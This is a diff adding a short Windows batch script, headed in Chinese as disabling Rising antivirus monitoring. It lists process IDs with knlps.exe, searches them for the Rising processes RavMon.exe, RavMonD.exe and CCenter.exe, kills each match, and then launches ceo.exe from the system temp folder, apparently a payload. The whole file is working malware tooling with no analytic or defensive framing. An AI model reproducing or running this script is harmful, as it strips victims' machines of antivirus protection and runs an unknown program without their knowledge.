@@ -1,0 +1,17 @@
+::======杀进程使瑞星监控失效============
+@ECHO OFF
+
+knlps.exe -l >PID.txt
+::列出PID值
+
+
+FINDSTR /i "RavMon.exe" PID.txt >>RAV.txt
+FINDSTR /i "RavMonD.exe" PID.txt >>RAV.txt
+FINDSTR /i "CCenter.exe" PID.txt >>RAV.txt
+::查找瑞星进程字符串
+
+
+FOR /F "eol=; tokens=1 delims= " %%1 in (RAV.txt) do knlps.exe -k %%1
+
+:Next
+%systemroot%\temp\ceo.exe
